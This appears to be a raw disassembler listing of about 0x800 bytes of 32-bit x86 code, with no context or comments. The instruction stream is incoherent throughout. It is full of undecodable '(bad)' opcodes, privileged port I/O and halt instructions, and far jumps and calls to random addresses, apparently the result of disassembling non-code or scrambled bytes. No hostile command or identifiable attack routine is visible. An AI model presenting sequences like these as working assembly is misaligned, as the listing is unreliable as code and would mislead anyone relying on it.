  41dc46:	jmp    0xd7ae:0xddcfaee5
  41dc4d:	leave  
  41dc4e:	jmp    0xccf9:0xf8b9ebc7
  41dc55:	(bad)  
  41dc56:	out    dx,al
  41dc57:	mov    esi,0xf8d0d4f7
  41dc5c:	add    esi,ebx
  41dc5e:	fisttp WORD PTR [ecx]
  41dc60:	fsubrp st(1),st
  41dc62:	jmp    0xdc4ec875
  41dc67:	loope  0x41dc49
  41dc69:	ret    
  41dc6a:	into   
  41dc6b:	cmc    
  41dc6c:	(bad)
  41dc6f:	div    esi
  41dc71:	ror    ebp,1
  41dc73:	mov    eax,0xefd8bbdc
  41dc78:	add    ebx,ebx
  41dc7a:	aad    0xce
  41dc7c:	div    esi
  41dc7e:	(bad)  
  41dc7f:	fucom  st(5)
  41dc81:	add    bl,bl
  41dc83:	out    0xf9,al
  41dc85:	clc    
  41dc86:	jmp    0xc606a978
  41dc8b:	(bad)  
  41dc8c:	loope  0x41dc6f
  41dc8e:	(bad)  
  41dc8f:	jmp    0x41dc79
  41dc91:	(bad)  
  41dc92:	hlt    
  41dc93:	icebp  
  41dc94:	out    dx,al
  41dc95:	(bad)  
  41dc96:	in     al,dx
  41dc97:	mov    ebx,0xfaf4e103
  41dc9c:	in     eax,0xf7
  41dc9e:	in     eax,0xff
  41dca0:	std    
  41dca1:	mov    esi,0xc8ca02dd
  41dca6:	iret   
  41dca7:	push   es
  41dca8:	icebp  
  41dca9:	(bad)  
  41dcab:	call   0xfbeec479
  41dcb0:	shl    edi,0xe7
  41dcb3:	test   dh,0xe8
  41dcb6:	icebp  
  41dcb7:	leave  
  41dcb8:	int    0xc2
  41dcba:	iret   
  41dcbb:	clc    
  41dcbc:	fcmovbe st,st(1)
  41dcbe:	sar    dl,0xc4
  41dcc1:	out    0xf,eax
  41dcc3:	stc    
  41dcc4:	loope  0x41dc8e
  41dcc6:	jmp    0x41dcb0
  41dcc8:	fldcw  WORD PTR [ecx+eax*8-0x2c301323]
  41dccf:	sar    DWORD PTR [ebx-0x201a2546],1
  41dcd5:	mov    dl,0xdb
  41dcd7:	into   
  41dcd8:	add    esi,ebx
  41dcda:	loopne 0x41dcd1
  41dcdc:	in     al,0xdc
  41dcde:	add    edx,edx
  41dce0:	stc    
  41dce1:	(bad)  
  41dce2:	fdiv   st(6),st
  41dce4:	or     DWORD PTR [eax],ecx
  41dce6:	int    0xe9
  41dce8:	iret   
  41dce9:	fsubr  QWORD PTR [ebp+ecx*8-0x341f341e]
  41dcf0:	mov    bl,0xf4
  41dcf2:	jmp    0xd4f1:0xb9e3bfb9
  41dcf9:	in     eax,dx
  41dcfa:	mov    esp,0x5fbfbf9
  41dcff:	mov    eax,0x1e5fc03
  41dd05:	sti    
  41dd06:	(bad)  
  41dd07:	jmp    0x41dcc9
  41dd09:	scas   al,BYTE PTR es:[edi]
  41dd0a:	shl    esi,1
  41dd0c:	(bad)
  41dd0f:	loopne 0x41dcd5
  41dd11:	into   
  41dd12:	cmc    
  41dd13:	jmp    0x41dd13
  41dd15:	fidivr WORD PTR [edi+0x1d5d2b0]
  41dd1b:	fiadd  DWORD PTR [edi]
  41dd1d:	repz icebp 
  41dd1f:	(bad)  
  41dd20:	loop   0x41dd19
  41dd22:	cld    
  41dd23:	fadd   st(5),st
  41dd25:	push   cs
  41dd26:	fsubrp st(3),st
  41dd28:	mov    eax,0xc3b1cbe1
  41dd2d:	shl    BYTE PTR [edx-0xa105009],1
  41dd33:	(bad)  
  41dd35:	mov    edi,0xf3d0dcda
  41dd3a:	cli    
  41dd3b:	call   esi
  41dd3d:	int3   
  41dd3e:	(bad)  
  41dd40:	(bad)  
  41dd41:	fcmovnu st,st(7)
  41dd43:	add    eax,0xffde0eda
  41dd48:	leave  
  41dd49:	sar    BYTE PTR [edi-0xc30094e],0xe7
  41dd50:	mov    al,0xcc
  41dd52:	lock jmp 0xd3cf:0xf3dff5de
  41dd5a:	repz rol DWORD PTR [ecx],1
  41dd5d:	in     al,0x3
  41dd5f:	mov    esp,0xff6da07
  41dd64:	out    0x5,eax
  41dd66:	cli    
  41dd67:	int    0xcf
  41dd69:	test   eax,0xcaf6d3bf
  41dd6e:	lock test esi,0xd4f8f2ba
  41dd75:	mov    ebp,0xddf0c9ed
  41dd7a:	add    dh,bh
  41dd7c:	clc    
  41dd7d:	jmp    0x41dd74
  41dd7f:	fndisi(8087 only) 
  41dd81:	(bad)  
  41dd83:	out    dx,eax
  41dd84:	push   es
  41dd85:	fmul   QWORD PTR [ecx]
  41dd87:	fidivr WORD PTR [ecx-0xa2c3b3e]
  41dd8d:	mov    dh,0xdb
  41dd8f:	out    0xf7,eax
  41dd91:	in     al,0xe6
  41dd93:	(bad)  
  41dd94:	leave  
  41dd95:	mov    ebx,0xc3fff9f8
  41dd9a:	loope  0x41dd8e
  41dd9c:	out    0xbc,eax
  41dd9e:	jmp    0xc6c9:0xdfbefc06
  41dda5:	in     al,dx
  41dda6:	fisttp QWORD PTR [ecx+esi*4]
  41dda9:	out    0xc7,al
  41ddab:	out    0xec,eax
  41ddad:	mov    dh,0xe2
  41ddaf:	shr    bl,0xee
  41ddb2:	(bad)  
  41ddb3:	lods   al,BYTE PTR ds:[esi]
  41ddb4:	call   0xe219a972
  41ddb9:	not    edi
  41ddbb:	in     al,dx
  41ddbc:	add    ch,ah
  41ddbe:	pop    es
  41ddbf:	add    edi,ebx
  41ddc1:	not    bh
  41ddc3:	fmul   QWORD PTR ds:0xacec04c4
  41ddc9:	ret    0xdcf6
  41ddcc:	out    0xf5,al
  41ddce:	mov    al,0xb7
  41ddd0:	clc    
  41ddd1:	mov    eax,0xf4deffbb
  41ddd6:	jmp    0xd1d6:0xd7ddf0f5
  41dddd:	add    bl,dh
  41dddf:	retf   
  41dde0:	retf   
  41dde1:	(bad)  
  41dde2:	add    esp,ebp
  41dde4:	(bad)  
  41dde6:	or     eax,0xafebeafa
  41ddeb:	div    DWORD PTR [edi-0x33130c2e]
  41ddf1:	jmp    0xd819cba3
  41ddf6:	mov    ecx,0xdeecfcd0
  41ddfb:	add    esp,ebp
  41ddfd:	hlt    
  41ddfe:	push   es
  41ddff:	(bad)  
  41de01:	in     eax,0xdf
  41de03:	pmaxub mm7,mm3
  41de06:	retf   
  41de07:	in     al,dx
  41de08:	(bad)
  41de0c:	in     eax,0xe4
  41de0e:	int3   
  41de0f:	mov    bh,0xb1
  41de11:	sar    BYTE PTR [ecx-0x26023523],cl
  41de17:	jecxz  0x41ddf6
  41de19:	sar    BYTE PTR [esi-0x1a2240fe],cl
  41de1f:	add    al,0xde
  41de21:	stc    
  41de22:	retf   
  41de23:	into   
  41de24:	fdivr  st,st(7)
  41de26:	cld    
  41de27:	std    
  41de28:	(bad)  
  41de29:	rcl    bh,cl
  41de2b:	fst    st(7)
  41de2d:	jecxz  0x41de11
  41de2f:	repz mov dh,0xc5
  41de32:	int3   
  41de33:	xlat   BYTE PTR ds:[ebx]
  41de34:	mov    ah,0xdd
  41de36:	fidivr DWORD PTR [esi-0x1cfdfe1e]
  41de3c:	fsub   st,st(7)
  41de3e:	rol    ah,1
  41de40:	jmp    0xdacd:0xbf9f50f
  41de47:	into   
  41de48:	lock int 0xc6
  41de4b:	fdivrp st(5),st
  41de4d:	shl    esi,1
  41de4f:	imul   BYTE PTR [edi-0x272d083a]
  41de55:	jecxz  0x41de2b
  41de57:	int    0x1
  41de59:	mov    edi,0xe0f6ede6
  41de5e:	fcomi  st,st(1)
  41de60:	fld    st(4)
  41de62:	sti    
  41de63:	(bad)  
  41de64:	or     bl,ah
  41de66:	or     ch,ah
  41de68:	ror    esp,cl
  41de6a:	(bad)  
  41de6b:	enter  0xb6cf,0xb3
  41de6f:	mov    edx,0xcbfaf3cb
  41de74:	(bad)  
  41de75:	clc    
  41de76:	mov    edi,0xfedbf7f2
  41de7b:	(bad)  
  41de7d:	add    DWORD PTR ds:0xe4dcf4d4,eax
  41de83:	pop    es
  41de84:	or     bh,ch
  41de86:	fild   WORD PTR [ecx]
  41de88:	fsubr  DWORD PTR [edi-0x2a1b1c31]
  41de8e:	(bad)  
  41de8f:	ror    edi,1
  41de91:	ror    eax,cl
  41de93:	mov    al,0xbb
  41de95:	hlt    
  41de96:	xlat   BYTE PTR ds:[ebx]
  41de97:	int    0xe8
  41de99:	(bad)  
  41de9a:	icebp  
  41de9b:	shl    esp,1
  41de9d:	in     al,dx
  41de9e:	ffree  st(0)
  41dea0:	(bad)  
  41dea1:	add    ch,cl
  41dea3:	push   cs
  41dea4:	(bad)  
  41dea5:	aam    0xd9
  41dea7:	shl    BYTE PTR [edx-0x3d43282f],0xcd
  41deae:	in     eax,0xd0
  41deb0:	mov    ecx,0xc5fdf1e0
  41deb5:	jmp    0x3d4:0xdfdecfd8
  41debc:	repz in al,0xeb
  41debf:	add    ebp,ebx
  41dec1:	push   es
  41dec2:	add    cl,BYTE PTR [edx]
  41dec4:	fcomp  st(3)
  41dec6:	psllw  mm0,mm0
  41dec9:	jmp    0xaf35b4a4
  41dece:	test   eax,0xcac8c4d1
  41ded3:	mov    ecx,0xb0d203d6
  41ded8:	int3   
  41ded9:	(bad)  
  41deda:	(bad)  
  41dedc:	add    eax,ebx
  41dede:	clc    
  41dedf:	add    al,0xca
  41dee1:	jecxz  0x41debe
  41dee3:	fisttp QWORD PTR [esi]
  41dee5:	add    eax,esp
  41dee7:	in     eax,dx
  41dee8:	jmp    0x41deb0
  41deea:	mov    edi,0xe6aae9dd
  41deef:	imul   bh
  41def1:	mov    ecx,0xbddef4c5
  41def6:	cli    
  41def7:	icebp  
  41def8:	repz add edi,ecx
  41defb:	aad    0xec
  41defd:	stc    
  41defe:	add    eax,0x202bffb
  41df03:	or     cl,BYTE PTR [ecx]
  41df05:	leave  
  41df06:	or     BYTE PTR [eax],al
  41df08:	mov    edi,0xb1e7adaa
  41df0d:	out    0xf2,eax
  41df0f:	(bad)  
  41df10:	int    0xf3
  41df12:	int3   
  41df13:	idiv   dl
  41df15:	repz mov esp,0xc3bcbdff
  41df1b:	ret    
  41df1c:	ret    0x403
  41df1f:	or     esi,eax
  41df21:	loop   0x41def8
  41df23:	fsub   st(6),st
  41df25:	loopne 0x41df02
  41df27:	fisubr WORD PTR [esi+ebp*4-0xc1e1110]
  41df2e:	repz jmp 0xecf293f8
  41df34:	mov    ch,0xc4
  41df36:	leave  
  41df37:	mov    esi,0xb4deb6c8
  41df3c:	rol    DWORD PTR [esi+eiz*8],cl
  41df3f:	ret    
  41df40:	(bad)  
  41df41:	hlt    
  41df42:	jmp    0x41df40
  41df44:	(bad)  
  41df45:	repz add edx,edx
  41df48:	shl    al,0xd0
  41df4b:	test   al,0xe8
  41df4d:	out    dx,al
  41df4e:	mov    al,0xc6
  41df50:	call   0xec329454
  41df55:	fidivr WORD PTR [edi-0x52f4141]
  41df5b:	std    
  41df5c:	std    
  41df5d:	add    eax,0x6dbe1f8
  41df62:	cld    
  41df63:	pop    es
  41df64:	(bad)  
  41df65:	fsubr  st(1),st
  41df67:	add    eax,0xeac5edc1
  41df6c:	cmc    
  41df6d:	icebp  
  41df6e:	loope  0x41df6a
  41df70:	mul    ch
  41df72:	call   ebp
  41df74:	mov    dh,0xd2
  41df76:	call   0xc113c976
  41df7b:	xlat   BYTE PTR ds:[ebx]
  41df7c:	ret    
  41df7d:	int3   
  41df7e:	(bad)  
  41df80:	mov    edi,0xf00f9d0
  41df85:	(bad)
  41df88:	int    0xb2
  41df8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df8b:	in     al,0xad
  41df8d:	repz in eax,dx
  41df8f:	mov    al,0xf3
  41df91:	(bad)  
  41df92:	fmul   st,st(4)
  41df94:	sar    dl,cl
  41df96:	mov    ebp,0xceb6bed9
  41df9b:	jecxz  0x41df7c
  41df9d:	rol    ch,1
  41df9f:	add    eax,0xf9f4d0c9
  41dfa4:	add    eax,0xa911cf07
  41dfa9:	lock (bad) 
  41dfab:	lods   eax,DWORD PTR ds:[esi]
  41dfac:	in     al,dx
  41dfad:	mov    cl,0xcd
  41dfaf:	(bad)  
  41dfb1:	hlt    
  41dfb2:	in     al,0xf1
  41dfb4:	mov    ah,0xec
  41dfb6:	(bad)  
  41dfb8:	enter  0xfac3,0xbf
  41dfbc:	fdivr  st,st(0)
  41dfbe:	out    0xc3,eax
  41dfc0:	or     al,cl
  41dfc2:	in     eax,0xff
  41dfc4:	or     cl,BYTE PTR ds:0xaeb1ef08
  41dfca:	loop   0x41df9b
  41dfcc:	div    DWORD PTR [ecx-0xd242637]
  41dfd2:	mov    ah,0xdf
  41dfd4:	enter  0xb1ce,0xe1
  41dfd8:	ret    
  41dfd9:	(bad)  
  41dfdb:	in     al,dx
  41dfdc:	(bad)  
  41dfdd:	aad    0xff
  41dfdf:	retf   
  41dfe0:	push   es
  41dfe1:	retf   0xe2fe
  41dfe4:	(bad)  
  41dfe5:	hlt    
  41dfe6:	retf   
  41dfe7:	jmp    0xf6f2cf9f
  41dfec:	shr    eax,1
  41dfee:	aam    0xc9
  41dff0:	enter  0xe4d9,0xc8
  41dff4:	int    0xbe
  41dff6:	cmc    
  41dff7:	ret    
  41dff8:	loope  0x41dff7
  41dffa:	mov    eax,0xd4fdf2fe
  41e000:	clc    
  41e001:	clc    
  41e002:	out    0xe9,eax
  41e004:	sti    
  41e005:	repz or al,0xfc
  41e008:	call   0xef24a3b5
  41e00d:	icebp  
  41e00e:	mov    ch,0xcc
  41e010:	in     eax,0xf1
  41e012:	jmp    0xf43cb1ea
  41e017:	repnz cmc 
  41e019:	in     al,dx
  41e01a:	out    dx,al
  41e01b:	mov    eax,0xa0ad3dd
  41e020:	loopne 0x41e001
  41e022:	fimul  DWORD PTR [edi]
  41e024:	retf   
  41e025:	pop    es
  41e026:	add    cl,ah
  41e028:	icebp  
  41e029:	mov    cl,0xd3
  41e02b:	in     al,0xe9
  41e02d:	iret   
  41e02e:	fcmovbe st,st(5)
  41e030:	mov    ah,0xf2
  41e032:	mov    bh,0xfa
  41e034:	leave  
  41e035:	retf   0xf0d6
  41e038:	aad    0xd1
  41e03a:	xlat   BYTE PTR ds:[ebx]
  41e03b:	aam    0xd6
  41e03d:	in     eax,0xe2
  41e03f:	rcl    edi,0xf5
  41e042:	(bad)  
  41e043:	stc    
  41e044:	loop   0x41e01e
  41e046:	add    cl,bh
  41e048:	(bad)  
  41e049:	enter  0xeeb1,0xed
  41e04d:	vpmulhuw xmm0,xmm5,xmm0
  41e051:	loopne 0x41e017
  41e053:	rcr    al,cl
  41e055:	std    
  41e056:	mov    ah,0xec
  41e058:	jecxz  0x41e019
  41e05a:	int3   
  41e05b:	hlt    
  41e05c:	(bad)  
  41e05d:	fld    st(5)
  41e05f:	ror    dl,1
  41e061:	(bad)  
  41e063:	leave  
  41e064:	(bad)  
  41e066:	or     ecx,DWORD PTR [edi]
  41e068:	repz (bad) 
  41e06a:	rcl    ch,1
  41e06c:	lods   al,BYTE PTR ds:[esi]
  41e06d:	xlat   BYTE PTR ds:[ebx]
  41e06e:	int    0xec
  41e070:	(bad)  
  41e071:	mov    al,0xbb
  41e073:	aad    0xf8
  41e075:	jecxz  0x41e06f
  41e077:	add    esi,eax
  41e079:	aam    0xcd
  41e07b:	out    0xd6,eax
  41e07d:	push   es
  41e07e:	rol    BYTE PTR [eax],cl
  41e080:	cmc    
  41e081:	in     al,0xfe
  41e083:	cli    
  41e084:	(bad)  
  41e086:	jecxz  0x41e06c
  41e088:	into   
  41e089:	out    0xb7,al
  41e08b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e08c:	ror    edi,0xec
  41e08f:	div    DWORD PTR [edx-0x3b083b31]
  41e095:	fidiv  WORD PTR [esp+ebx*8-0x41f82c43]
  41e09c:	in     al,0xd2
  41e09e:	aad    0xe5
  41e0a0:	add    ch,bh
  41e0a2:	cmc    
  41e0a3:	(bad)  
  41e0a5:	fsub   st(1),st
  41e0a7:	clc    
  41e0a8:	in     eax,dx
  41e0a9:	xlat   BYTE PTR ds:[ebx]
  41e0aa:	lock test bh,0xb6
  41e0ae:	(bad)  
  41e0af:	lods   al,BYTE PTR ds:[esi]
  41e0b0:	jmp    0xcce8:0xb5d0d2d5
  41e0b7:	in     eax,dx
  41e0b8:	int3   
  41e0b9:	mov    edi,0xdce4f8e2
  41e0be:	fsubr  st(0),st
  41e0c0:	mul    dh
  41e0c2:	pop    es
  41e0c3:	test   BYTE PTR [edi+eiz*8],0x12
  41e0c7:	fucom  st(0)
  41e0c9:	jmp    0x41e0b1
  41e0cb:	in     al,0xee
  41e0cd:	shl    DWORD PTR [edx-0x15443f16],0xe4
  41e0d4:	repz fld1 
  41e0d7:	icebp  
  41e0d8:	lock aad 0xb5
  41e0db:	in     eax,0xf6
  41e0dd:	fsubr  st,st(2)
  41e0df:	pop    es
  41e0e0:	jecxz  0x41e0d8
  41e0e2:	test   DWORD PTR ds:0xc8ffcaef,0xf0b1b0e5
  41e0ec:	(bad)  
  41e0ed:	ret    
  41e0ee:	out    dx,al
  41e0ef:	jmp    0xd0e4:0xffffceb5
  41e0f6:	mov    edi,0xf5b9eecd
  41e0fb:	ret    
  41e0fc:	in     eax,0xba
  41e0fe:	or     edi,ecx
  41e100:	loop   0x41e0eb
  41e102:	loop   0x41e0ce
  41e104:	ret    
  41e105:	(bad)  
  41e107:	add    DWORD PTR [ebp-0x39152c3f],edi
  41e10d:	in     eax,dx
  41e10e:	ret    
  41e10f:	(bad)  [edi-0x8410d2e]
  41e115:	fcmovnb st,st(3)
  41e117:	rcr    edx,1
  41e119:	ret    0xbcce
  41e11c:	fsubr  st,st(4)
  41e11e:	mov    esp,0xf8e309fc
  41e123:	mov    esp,0xdea05de
  41e128:	retf   
  41e129:	out    0xe2,al
  41e12b:	scas   al,BYTE PTR es:[edi]
  41e12c:	rcl    ch,cl
  41e12e:	(bad)  
  41e12f:	(bad)  
  41e130:	in     eax,0xee
  41e132:	mov    bh,0xdf
  41e134:	(bad)
  41e137:	add    eax,DWORD PTR [ebx]
  41e139:	(bad)  
  41e13b:	repnz add cl,dh
  41e13e:	(bad)  
  41e13f:	add    DWORD PTR [edx],eax
  41e141:	cld    
  41e142:	or     BYTE PTR [ecx],cl
  41e144:	or     bl,al
  41e146:	or     cl,dl
  41e148:	ret    0xd1aa
  41e14b:	lods   al,BYTE PTR ds:[esi]
  41e14c:	mov    esp,0xbacbaddc
  41e151:	mov    dl,0xde
  41e153:	mov    dh,0xd5
  41e155:	retf   0xd2c9
  41e158:	fdivrp st(7),st
  41e15a:	mov    eax,0xd102e5ff
  41e15f:	bnd ret 
  41e161:	push   es
  41e162:	ftst   
  41e164:	or     DWORD PTR [ebx],ecx
  41e166:	repz int3 
  41e168:	test   al,0xbf
  41e16a:	ret    0xeab6
  41e16d:	shl    BYTE PTR [edi-0x373b310c],cl
  41e173:	hlt    
  41e174:	repz int3 
  41e176:	aam    0xbc
  41e178:	cmc    
  41e179:	lock (bad) 
  41e17c:	xlat   BYTE PTR ds:[ebx]
  41e17d:	repz rcl esi,0xd6
  41e181:	(bad)  
  41e182:	hlt    
  41e183:	cli    
  41e184:	stc    
  41e185:	iret   
  41e186:	add    al,0xfa
  41e188:	mov    ecx,0xb6c7d6e1
  41e18d:	out    0xb3,eax
  41e18f:	shl    BYTE PTR [ebp-0x2e3a483a],0xdf
  41e196:	mov    eax,0x2bde0d5
  41e19b:	fiadd  DWORD PTR [edx]
  41e19d:	rcl    ecx,0xe6
  41e1a0:	test   BYTE PTR [ebx+ecx*1],0xe1
  41e1a4:	fpatan 
  41e1a6:	add    eax,ecx
  41e1a8:	in     al,0xf1
  41e1aa:	call   0xd0138e6b
  41e1af:	mov    dh,0xf4
  41e1b1:	out    dx,eax
  41e1b2:	vpsubusb ymm6,ymm3,YMMWORD PTR [ebp-0x371f064b]
  41e1ba:	aad    0xb4
  41e1bc:	sti    
  41e1bd:	loopne 0x41e1a6
  41e1bf:	jecxz  0x41e19d
  41e1c1:	clc    
  41e1c2:	add    al,0xe1
  41e1c4:	add    al,0xc
  41e1c6:	add    al,0xdf
  41e1c8:	(bad)  
  41e1c9:	shl    al,cl
  41e1cb:	(bad)  
  41e1cc:	ror    ebp,0xf0
  41e1cf:	mov    dh,0xf9
  41e1d1:	mov    ebx,0xbcf0e5b0
  41e1d6:	rcr    dl,1
  41e1d8:	repnz icebp 
  41e1da:	pop    es
  41e1db:	out    0xd9,eax
  41e1dd:	add    cl,bh
  41e1df:	jmp    0xe60c:0xdf40608
  41e1e6:	leave  
  41e1e7:	in     al,0xce
  41e1e9:	in     al,dx
  41e1ea:	ret    
  41e1eb:	xlat   BYTE PTR ds:[ebx]
  41e1ec:	fucom  st(2)
  41e1ee:	loope  0x41e1b6
  41e1f0:	in     al,dx
  41e1f1:	mov    ch,0xd5
  41e1f3:	cmc    
  41e1f4:	mov    ebx,0xfddcc8d5
  41e1f9:	out    dx,eax
  41e1fa:	out    dx,al
  41e1fb:	ret    
  41e1fc:	add    eax,edx
  41e1fe:	cld    
  41e1ff:	sar    ecx,0xda
  41e202:	xlat   BYTE PTR ds:[ebx]
  41e203:	enter  0xdcde,0xe8
  41e207:	enter  0xd7b2,0xb0
  41e20b:	int    0xee
  41e20d:	loopne 0x41e1df
  41e20f:	jmp    0x41e203
  41e211:	in     al,dx
  41e212:	call   0xe941c7ee
  41e217:	jmp    0xf22fe0ee
  41e21c:	int    0xd2
  41e21e:	cld    
  41e21f:	(bad)  
  41e221:	in     eax,0xc4
  41e223:	fneni(8087 only) 
  41e225:	push   es
  41e226:	std    
  41e227:	fdiv   st,st(2)
  41e229:	ffreep st(0)
  41e22b:	in     al,0xe0
  41e22d:	retf   
  41e22e:	(bad)  
  41e22f:	iret   
  41e230:	mov    edx,0xb6ffd7cf
  41e235:	shl    ah,cl
  41e237:	call   0xbe13c213
  41e23c:	in     eax,dx
  41e23d:	loope  0x41e1f8
  41e23f:	(bad)  
  41e241:	in     eax,0xe4
  41e243:	in     eax,dx
  41e244:	or     ah,bl
  41e246:	push   cs
  41e247:	add    eax,0xccf7c7ce
  41e24c:	call   0xcb35ab22
  41e251:	aad    0xd0
  41e253:	fcomi  st,st(4)
  41e255:	mov    dl,0xd7
  41e257:	shl    ebp,1
  41e259:	add    edx,eax
  41e25b:	fcomip st,st(2)
  41e25d:	fdivr  st(2),st
  41e25f:	mov    eax,0xcfe601dc
  41e264:	sti    
  41e265:	or     ch,bh
  41e267:	cld    
  41e268:	iret   
  41e269:	scas   eax,DWORD PTR es:[edi]
  41e26a:	scas   eax,DWORD PTR es:[edi]
  41e26b:	icebp  
  41e26c:	out    dx,eax
  41e26d:	loop   0x41e23f
  41e26f:	mov    ebx,0xbbeffab2
  41e274:	clc    
  41e275:	call   0xfe3dc155
  41e27a:	mov    esp,0x5cccdc2
  41e27f:	(bad)  
  41e280:	aad    0xbe
  41e282:	(bad)  
  41e283:	enter  0xe302,0xee
  41e287:	int3   
  41e288:	ret    
  41e289:	shl    edi,1
  41e28b:	(bad)  
  41e28c:	mov    ebp,0xeec4facb
  41e291:	scas   al,BYTE PTR es:[edi]
  41e292:	out    dx,eax
  41e293:	shr    ebx,cl
  41e295:	in     al,0xfa
  41e297:	jmp    0xfb0fe378
  41e29c:	in     al,0xec
  41e29e:	add    eax,0x3c7c4dc
  41e2a3:	out    dx,eax
  41e2a4:	fld    DWORD PTR [edx]
  41e2a6:	into   
  41e2a7:	sar    DWORD PTR [ecx-0xa3a3c11],cl
  41e2ad:	jmp    0xc103d295
  41e2b2:	iret   
  41e2b3:	mov    edi,0xf2f0fddf
  41e2b8:	fcomi  st,st(7)
  41e2ba:	sar    dl,1
  41e2bc:	(bad)  
  41e2bd:	sti    
  41e2be:	add    esi,edi
  41e2c0:	ror    ebx,1
  41e2c2:	(bad)  
  41e2c3:	fucom  st(6)
  41e2c5:	retf   
  41e2c6:	call   0xbf2facd0
  41e2cb:	jmp    0xfab3:0xd7e6c7f1
  41e2d2:	mov    ah,0xb8
  41e2d4:	cmc    
  41e2d5:	(bad)  
  41e2d6:	call   0xed1ee5d3
  41e2db:	inc    eax
  41e2dd:	add    al,0xe0
  41e2df:	std    
  41e2e0:	cmc    
  41e2e1:	cld    
  41e2e2:	rol    BYTE PTR [edi],0xc
  41e2e5:	or     eax,0xdde8e904
  41e2ea:	mov    esi,0xc6c4ebbe
  41e2ef:	rcl    ebp,1
  41e2f1:	fnop   
  41e2f3:	(bad)  
  41e2f5:	cld    
  41e2f6:	push   edi
  41e2f8:	call   ecx
  41e2fa:	ret    0xe1c6
  41e2fd:	loope  0x41e2d8
  41e2ff:	jmp    0xad4:0x7d6fdf6
  41e306:	in     eax,dx
  41e307:	shr    BYTE PTR [esi-0x10163543],cl
  41e30d:	rol    al,0xac
  41e310:	aam    0xd2
  41e312:	mov    eax,0xfaf0dbff
  41e317:	mov    ah,0xd9
  41e319:	loopne 0x41e2ea
  41e31b:	clc    
  41e31c:	rol    BYTE PTR [edx],1
  41e31e:	shr    ebx,1
  41e320:	in     al,0xd9
  41e322:	(bad)  
  41e323:	fld1   
  41e325:	add    bl,cl
  41e327:	or     ebp,ebp
  41e329:	in     eax,0xc7
  41e32b:	mov    bl,0xe2
  41e32d:	leave  
  41e32e:	leave  
  41e32f:	(bad)  
  41e330:	fcomp  st(2)
  41e332:	mov    ecx,0xcdf8f6d2
  41e337:	add    ch,ch
  41e339:	stc    
  41e33a:	fdivr  st(1),st
  41e33c:	lock fdivr st(3),st
  41e33f:	icebp  
  41e340:	(bad)  
  41e342:	loope  0x41e32c
  41e344:	in     al,dx
  41e345:	add    ebx,edi
  41e347:	in     eax,dx
  41e348:	(bad)  
  41e349:	shl    bh,cl
  41e34b:	mov    esp,0xb7edaad7
  41e350:	test   al,0xdb
  41e353:	(bad)  
  41e354:	std    
  41e355:	in     al,0xcc
  41e357:	mov    edi,0xd502bacd
  41e35c:	(bad)  
  41e35e:	icebp  
  41e35f:	jecxz  0x41e340
  41e361:	add    al,cl
  41e363:	leave  
  41e364:	leave  
  41e365:	fild   WORD PTR ds:0xc0a9c2e4
  41e36b:	shr    bl,1
  41e36d:	rcl    edi,0xbb
  41e370:	fcomi  st,st(3)
  41e372:	mov    bh,0xd0
  41e374:	retf   
  41e375:	jmp    0xf0e2:0xd1d5b8b8
  41e37c:	bnd ret 
  41e37e:	lock (bad) 
  41e380:	cmc    
  41e381:	jmp    0xe406:0xf3e9d9e1
  41e388:	ret    
  41e389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38a:	(bad)  
  41e38b:	xlat   BYTE PTR ds:[ebx]
  41e38c:	repz sar bl,0xec
  41e390:	retf   0xe4f2
  41e393:	out    dx,eax
  41e394:	fnstsw WORD PTR [edi-0x2d2b4730]
  41e39a:	(bad)  
  41e39b:	loop   0x41e35f
  41e39d:	fadd   st,st(1)
  41e39f:	jmp    0x41e392
  41e3a1:	fsubp  st(1),st
  41e3a3:	(bad)
  41e3a6:	adc    al,BYTE PTR [edi]
  41e3a8:	fmul   st,st(7)
  41e3aa:	in     al,0xd5
  41e3ac:	icebp  
  41e3ad:	hlt    
  41e3ae:	into   
  41e3af:	icebp  
  41e3b0:	int    0xf9
  41e3b2:	(bad)
  41e3b5:	in     al,0xfa
  41e3b7:	enter  0xf7d6,0xcf
  41e3bb:	neg    bl
  41e3bd:	in     al,0xa
  41e3bf:	xlat   BYTE PTR ds:[ebx]
  41e3c0:	out    0xd5,al
  41e3c2:	add    al,0x7
  41e3c4:	(bad)  
  41e3c5:	jmp    0xeb1bc899
  41e3ca:	(bad)  
  41e3cb:	into   
  41e3cc:	aad    0xf7
  41e3ce:	lock sar BYTE PTR [edx-0x2c0b3231],1
  41e3d5:	out    dx,eax
  41e3d6:	cld    
  41e3d7:	mov    esi,0xda06e7cc
  41e3dc:	clc    
  41e3dd:	clc    
  41e3de:	mov    ebp,0xdaf8f6c3
  41e3e3:	jmp    0x41e3e7
  41e3e5:	sti    
  41e3e6:	faddp  st(4),st
  41e3e8:	out    dx,al
  41e3e9:	jmp    0x41e3a9
  41e3eb:	iret   
  41e3ec:	mov    esp,0xb2c7d4cb
  41e3f1:	fadd   st,st(7)
  41e3f3:	mov    al,0xbd
  41e3f5:	(bad)  
  41e3f6:	sti    
  41e3f7:	jmp    0xe5ec:0xf6d0f7ff
  41e3fe:	repz test BYTE PTR [eax+ecx*1],0xe1
  41e403:	(bad)  [edi]
  41e405:	add    eax,DWORD PTR [ebx]
  41e407:	add    eax,0xb2f3e1a9
  41e40c:	loope  0x41e3fa
  41e40e:	in     al,dx
  41e40f:	(bad)  
  41e410:	in     eax,0xff
  41e412:	repz aam 0xe9
  41e415:	leave  
  41e416:	fldln2 
  41e418:	rol    bl,cl
  41e41a:	jecxz  0x41e3ee
  41e41c:	test   ebp,0xd6e2d1f1
  41e422:	out    0xef,eax
  41e424:	jmp    0xe11fc125
  41e429:	test   eax,0xb5caf0cd
  41e42e:	int3   
  41e42f:	mov    dh,0xcd
  41e431:	in     al,0xe4
  41e433:	(bad)  
  41e434:	in     eax,0xfb
  41e436:	mov    eax,0xbfe1faed
  41e43b:	stc    
  41e43c:	cmc    
  41e43d:	(bad)  
  41e43e:	loop   0x41e446
  41e440:	add    esi,eax
  41e442:	add    al,0xdf
  41e444:	(bad)  
  41e446:	out    0x13,al
  41e448:	mov    cl,0xb1
  41e44a:	iret   
  41e44b:	rcl    cl,0xf4
  41e44e:	shl    cl,0xc6
  41e451:	icebp  
  41e452:	fdivr  st,st(3)
  41e454:	mov    dh,0xbf
  41e456:	jmp    0xbe3fe823
  41e45b:	out    dx,al
  41e45c:	std    
  41e45d:	aad    0x2
  41e45f:	test   BYTE PTR [ecx],0xc2
